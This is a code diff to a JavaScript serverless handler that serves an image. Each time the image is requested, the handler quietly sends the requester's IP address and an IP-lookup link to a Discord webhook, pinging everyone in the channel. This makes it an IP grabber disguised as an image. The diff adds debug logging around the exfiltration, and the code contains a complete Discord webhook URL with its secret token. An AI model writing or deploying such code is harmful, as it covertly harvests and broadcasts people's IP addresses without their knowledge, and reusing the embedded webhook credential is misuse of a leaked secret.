@@ -2,22 +2,25 @@ import fs from 'fs';
 import path from 'path';
 
 export default async function handler(req, res) {
-  const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress || "unknown";
+  const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.socket.remoteAddress || "unknown";
+
+  console.log("Request IP:", ip);
 
   const lookupLink = `https://www.whtop.com/tools.ip/${ip}`;
+  const discordMessage = `@everyone @here\n\n${ip}\n${lookupLink}`;
 
-  // Send to Discord and WAIT for it
-  try {
-    await fetch("https://discord.com/api/webhooks/1472338172590555271/Zop_dg-2Wf5zULZGGJT380mnKqM1O6Rhfu5VwSf1f0O1zxyWyNdGVhVkPcZxYSCAbMEl", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        content: `@everyone @here\n\n${ip}\n${lookupLink}`
-      })
-    });
-  } catch (e) {
-    console.error("Discord error:", e);
-  }
+  console.log("Sending to Discord:", discordMessage);
+
+  // Send to Discord
+  const discordResponse = await fetch("https://discord.com/api/webhooks/1472338172590555271/Zop_dg-2Wf5zULZGGJT380mnKqM1O6Rhfu5VwSf1f0O1zxyWyNdGVhVkPcZxYSCAbMEl", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+      content: discordMessage
+    })
+  });
+
+  console.log("Discord response status:", discordResponse.status);
 
   // Serve the image
   try {
@@ -28,6 +31,7 @@ export default async function handler(req, res) {
     res.setHeader('Cache-Control', 'no-cache');
     res.status(200).send(imageBuffer);
   } catch (error) {
+    console.error("Image error:", error);
     res.status(404).json({ error: 'Image not found' });
   }
 }
